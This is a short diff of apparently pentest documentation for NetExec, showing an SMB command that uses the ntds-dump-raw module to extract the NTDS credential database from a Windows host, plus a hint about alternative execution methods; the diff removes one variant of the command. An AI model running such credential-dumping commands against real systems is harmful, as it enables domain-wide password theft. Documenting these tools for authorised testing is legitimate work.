@@ -53,7 +53,3 @@ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntds-dump-raw -o TARGET=N
 {% hint style="warning" %}
 If encountering command execution errors, specify an alternative execution method such as --exec-method wmiexec or --exec-method atexec
 {% endhint %} 
-
-```bash
-nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntds-dump-raw -o TARGET=NTDS --exec-method wmiexec
-```
